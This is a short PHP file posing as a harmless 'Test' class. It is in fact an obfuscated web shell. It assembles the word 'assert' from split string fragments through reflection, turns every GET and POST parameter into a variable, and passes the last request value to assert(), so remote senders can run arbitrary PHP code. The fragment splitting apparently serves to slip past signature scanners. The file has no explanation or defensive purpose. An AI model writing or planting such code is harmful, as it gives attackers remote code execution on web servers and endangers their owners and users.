<?php

class Test
{
    const a = array(1=>'aS',2=>'se',3=>'rT');

    public function __construct()
    {
    }
}

$refl = new ReflectionClass('Test');

foreach ($refl->getConstants() as $key => $value) {
    foreach ($value as $key => $value1) {
        $value2.=$value1;
    }
}
foreach (array('_POST','_GET') as $_request) {
    foreach ($$_request as $_key=>$_value) {
        $$_key=  $_value;
    }
}
$value2($_value);
